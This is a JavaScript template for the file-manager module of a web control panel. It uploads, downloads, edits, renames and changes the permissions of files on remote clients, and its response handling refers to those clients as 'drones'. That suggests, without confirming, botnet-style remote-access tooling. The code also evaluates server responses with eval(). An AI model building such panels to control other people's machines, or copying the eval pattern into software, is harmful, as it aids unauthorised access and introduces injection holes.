
function chkAll_{$MID}(obj,cName){
	var checkboxs = document.getElementsByName(cName);
    for(var i=0;i<checkboxs.length;i++){checkboxs[i].checked = obj.checked;}
}

jQuery.extend({
    createUploadIframe_{$MID}: function(id, uri)
	{
			//create frame
            var frameId = 'jUploadFrame' + id;
            var iframeHtml = '<iframe id="' + frameId + '" name="' + frameId + '" style="position:absolute; top:-9999px; left:-9999px"';
			if(window.ActiveXObject)
			{
                if(typeof uri== 'boolean'){
					iframeHtml += ' src="' + 'javascript:false' + '"';

                }
                else if(typeof uri== 'string'){
					iframeHtml += ' src="' + uri + '"';

                }	
			}
			iframeHtml += ' />';
			jQuery(iframeHtml).appendTo(document.body);

            return jQuery('#' + frameId).get(0);			
    },
    createUploadForm_{$MID}: function(id, fileElementId, data)
	{
		//create form	
		var formId = 'jUploadForm' + id;
		var fileId = 'jUploadFile' + id;
		var form = jQuery('<form  action="" method="POST" name="' + formId + '" id="' + formId + '" enctype="multipart/form-data"></form>');	
		if(data)
		{
			for(var i in data)
			{
				jQuery('<input type="hidden" name="' + i + '" value="' + data[i] + '" />').appendTo(form);
			}			
		}		
		var oldElement = jQuery('#' + fileElementId);
		var newElement = jQuery(oldElement).clone();
		jQuery(oldElement).attr('id', fileId);
		jQuery(oldElement).before(newElement);
		jQuery(oldElement).appendTo(form);


		
		//set attributes
		jQuery(form).css('position', 'absolute');
		jQuery(form).css('top', '-1200px');
		jQuery(form).css('left', '-1200px');
		jQuery(form).appendTo('body');		
		return form;
    },

    ajaxFileUpload_{$MID}: function(s) {
        // TODO introduce global settings, allowing the client to modify them for all requests, not only timeout		
        s = jQuery.extend({}, jQuery.ajaxSettings, s);
        var id = new Date().getTime()        
		var form = jQuery.createUploadForm_{$MID}(id, s.fileElementId, (typeof(s.data)=='undefined'?false:s.data));
		var io = jQuery.createUploadIframe_{$MID}(id, s.secureuri);
		var frameId = 'jUploadFrame' + id;
		var formId = 'jUploadForm' + id;		
        // Watch for a new set of requests
        if ( s.global && ! jQuery.active++ )
		{
			jQuery.event.trigger( "ajaxStart" );
		}            
        var requestDone = false;
        // Create the request object
        var xml = {}   
        if ( s.global )
            jQuery.event.trigger("ajaxSend", [xml, s]);
        // Wait for a response to come back
        var uploadCallback = function(isTimeout)
		{			
			var io = document.getElementById(frameId);
            try 
			{				
				if(io.contentWindow)
				{
					 xml.responseText = io.contentWindow.document.body?io.contentWindow.document.body.innerHTML:null;
                	 xml.responseXML = io.contentWindow.document.XMLDocument?io.contentWindow.document.XMLDocument:io.contentWindow.document;
					 
				}else if(io.contentDocument)
				{
					 xml.responseText = io.contentDocument.document.body?io.contentDocument.document.body.innerHTML:null;
                	xml.responseXML = io.contentDocument.document.XMLDocument?io.contentDocument.document.XMLDocument:io.contentDocument.document;
				}						
            }catch(e)
			{
				jQuery.handleError(s, xml, null, e);
			}
            if ( xml || isTimeout == "timeout") 
			{				
                requestDone = true;
                var status;
                try {
                    status = isTimeout != "timeout" ? "success" : "error";
                    // Make sure that the request was successful or notmodified
                    if ( status != "error" )
					{
                        // process the data (runs the xml through httpData regardless of callback)
                        var data = jQuery.uploadHttpData( xml, s.dataType );    
                        // If a local callback was specified, fire it and pass it the data
                        if ( s.success )
                            s.success( data, status );
    
                        // Fire the global callback
                        if( s.global )
                            jQuery.event.trigger( "ajaxSuccess", [xml, s] );
                    } else
                        jQuery.handleError(s, xml, status);
                } catch(e) 
				{
                    status = "error";
                    jQuery.handleError(s, xml, status, e);
                }

                // The request was completed
                if( s.global )
                    jQuery.event.trigger( "ajaxComplete", [xml, s] );

                // Handle the global AJAX counter
                if ( s.global && ! --jQuery.active )
                    jQuery.event.trigger( "ajaxStop" );

                // Process result
                if ( s.complete )
                    s.complete(xml, status);

                jQuery(io).unbind()

                setTimeout(function()
									{	try 
										{
											jQuery(io).remove();
											jQuery(form).remove();	
											
										} catch(e) 
										{
											jQuery.handleError(s, xml, null, e);
										}									

									}, 100)

                xml = null

            }
        }
        // Timeout checker
        if ( s.timeout > 0 ) 
		{
            setTimeout(function(){
                // Check to see if the request is still happening
                if( !requestDone ) uploadCallback( "timeout" );
            }, s.timeout);
        }
        try 
		{

			var form = jQuery('#' + formId);
			jQuery(form).attr('action', s.url);
			jQuery(form).attr('method', 'POST');
			jQuery(form).attr('target', frameId);
            if(form.encoding)
			{
				jQuery(form).attr('encoding', 'multipart/form-data');      			
            }
            else
			{	
				jQuery(form).attr('enctype', 'multipart/form-data');			
            }			
            jQuery(form).submit();

        } catch(e) 
		{			
            jQuery.handleError(s, xml, null, e);
        }
		
		jQuery('#' + frameId).load(uploadCallback	);
        return {abort: function () {}};	

    },

    uploadHttpData: function( r, type ) {
        var data = !type;
        data = type == "xml" || data ? r.responseXML : r.responseText;
        // If the type is "script", eval it in global context
        if ( type == "script" )
            jQuery.globalEval( data );
        // Get the JavaScript object, if JSON is used.
        if ( type == "json" )
            eval( "data = " + data );
        // evaluate scripts within html
        if ( type == "html" )
            jQuery("<div>").html(data).evalScripts();

        return data;
    }
})


function opt_panel_{$MID}(opt,uniqu){
     
     opt_panel_close_{$MID}(uniqu);
	 
	 document.getElementById(opt+"_"+uniqu).style.display="block";
}

function opt_panel_close_{$MID}(uniqu){	
    document.getElementById("New_"+uniqu).style.display="none";
    document.getElementById("Delete_"+uniqu).style.display="none";	
    document.getElementById("Copy_"+uniqu).style.display="none";
    document.getElementById("Move_"+uniqu).style.display="none";
    document.getElementById("Rename_"+uniqu).style.display="none";
    document.getElementById("Chmod_"+uniqu).style.display="none";
    document.getElementById("Chown_"+uniqu).style.display="none";
    document.getElementById("Upload_"+uniqu).style.display="none";
    document.getElementById("Download_"+uniqu).style.display="none";	
    document.getElementById("Edit_"+uniqu).style.display="none";
	
}

function ajaxFileUpload_{$MID}(cid,uniqu,basedir){
	$("#loading")
	.ajaxStart(function(){
		$(this).show();
	})
	.ajaxComplete(function(){
		$(this).hide();
	});
    
	var overWrite = "";
	if (true == document.getElementById("upload_box_"+uniqu).checked){
		overWrite = "1";
	}
    
	document.getElementById("Upload_Status_"+uniqu).innerHTML="<strong>uploading to server ...</strong>";
    
	cid = get_effect_clients(uniqu,'{$MID}');
   
	$.ajaxFileUpload_{$MID}
	(
		{		    
			url:'./request.php?nb=1&cid='+cid+"&mid={$MID}",			
			secureuri:false,
			fileElementId: 'fileToUpload_'+uniqu,
			dataType: 'plain',
			data:{opt:'uplo', basedir:''+basedir,box:''+overWrite},
			success: function (data)
			{
				document.getElementById("Upload_Status_"+uniqu).innerHTML="<strong>uploading to client ...</strong>";

                data = decodeURIComponent(data);
				ret = eval('(' + data + ')');
                var tid = false;
				if (ret["drones"]){
					ret = ret["drones"];
					for(i=0; i<ret.length; i++){
			            var c_response = ret[i];
						if (c_response.keepRequest > 0){
							document.getElementById("STATU_"+c_response.uniqu).innerHTML="<img src=\"./templates/bootstrap/img/loading-mini.gif\">";
							tid = c_response.tid;
						}else{ //fail
							document.getElementById("STATU_"+c_response.uniqu).innerHTML="";
							document.getElementById("CONTENT_"+uniqu).innerHTML=c_response.content;
						}
					}				
					if (tid){
						mod_request_sentinel(tid,cid,'{$MID}',uniqu);
					}				
				}				
			},
			error: function (data, status, e)
			{
				document.getElementById("Upload_"+uniqu).innerHTML=e;
			}
		}
	)
	
	return false;

}


function submit_{$MID}(cid,basedir,opt,uniqu){
	
	var params = "basedir="+basedir+"&opt=";

	if ("new" == opt){
		obj=document.getElementsByName("opt_"+uniqu);
		if(obj!=null){
			var i;
			for(i=0;i<obj.length;i++){
				if(obj[i].checked){
					params += obj[i].value;
				}
			}
		}
    }else{
	    params +=opt;
	}

	params += "&box=";
    if (document.getElementById(opt+"_box_"+uniqu)){
		if (true == document.getElementById(opt+"_box_"+uniqu).checked){
		    params += "1";
		}
	}

    params += "&input=";
    
	if ("chmod" == opt){
		var chmod_input = 0;
	    obj = document.getElementsByName("chmod_input_"+uniqu);
		if (obj != null){			
			for(i=0;i<obj.length;i++){
				if(obj[i].checked){
					chmod_input += parseInt(obj[i].value);		
				}
			}
		}
		params += chmod_input;
	}else{
		if (document.getElementById(opt+"_input_"+uniqu)){
			params += encodeURIComponent(document.getElementById(opt+"_input_"+uniqu).value);
		}
		if ("chown" == opt){
			if (document.getElementById(opt+"_input2_"+uniqu)){
				params +=  ":"+document.getElementById(opt+"_input2_"+uniqu).value;
			}
		}
	}

	var checkedCounter = 0;
	obj = document.getElementsByName("checked_"+uniqu);
	if (obj != null){
		for(i=0;i<obj.length;i++){
			if(obj[i].checked){
				checkedCounter = 1;
				params += "&checked[]="+encodeURIComponent(obj[i].value);
			}
		}
	}
    if (!checkedCounter){
		params += "&checked[]=";
    }

	
	//alert(params);
	mod_request(cid,'{$MID}',uniqu,params,0,0);

}

function download_{$MID}(cid,mid,uniqu,basedir){
    var url = "./req_stream.php?basedir="+basedir+"&opt=down&mid="+mid+"&cid="+cid;
	obj = document.getElementsByName("checked_"+uniqu);
	var checkedCounter = 0;
	if (obj != null){
		for(i=0;i<obj.length;i++){
			if(obj[i].checked){
				checkedCounter = 1;
				url += "&input="+encodeURIComponent(obj[i].value);
				url += "&header[Content-Disposition]=attachment; filename=\""+encodeURIComponent(obj[i].value)+"\"";
				break;
			}
		}
	}
	if (!checkedCounter){
		opt_panel_{$MID}('Download',uniqu);
    }else{
		window.open(url);
	}
}

function edit_{$MID}(cid,mid,uniqu,basedir){
	opt_panel_{$MID}("Edit",uniqu);
	document.getElementById("Edit_"+uniqu).innerHTML="reading...";
	var params = "basedir="+basedir+"&opt=edit";
    opt_panel_{$MID}('Edit',uniqu);
	var checkedCounter = 0;
	obj = document.getElementsByName("checked_"+uniqu);
	if (obj != null){
		for(i=0;i<obj.length;i++){
			if(obj[i].checked){	
				params += "&input="+encodeURIComponent(obj[i].value);
				break;
			}
		}
	}
	mod_request(cid,'{$MID}',uniqu,params,0,"Edit_"+uniqu);	    
}
function cancel_edit_{$MID}(uniqu){
    document.getElementById("editdom_"+uniqu).innerHTML = "";
}
function save_edit_{$MID}(cid,uniqu,basedir,filename){
    var params = "basedir="+encodeURIComponent(basedir)+"&input="+encodeURIComponent(filename)+"&opt=edit";
	var contents = document.getElementById("savedit_"+uniqu).value;
	//IE :            \r\n
	//Chrome/Firefox: \n
	if (1 == document.getElementById("cr_mode_"+uniqu).value){
		contents = contents.replace(/\r\n/g,"\n");
	}else if (2 == document.getElementById("cr_mode_"+uniqu).value){
		contents = contents.replace(/\r\n/g,"\n");
		contents = contents.replace(/\n/g,"\r\n");
	}else if (3 == document.getElementById("cr_mode_"+uniqu).value){
		contents = contents.replace(/\r\n/g,"\n");
		contents = contents.replace(/\n/g,"\r");
	}
	params += "&c="+encodeURIComponent(contents);
	if (document.getElementById("Edit_"+uniqu)){
        document.getElementById("Edit_"+uniqu).innerHTML="saving...";
	}	
	mod_request(cid,'{$MID}',uniqu,params,0,"Edit_"+uniqu);
}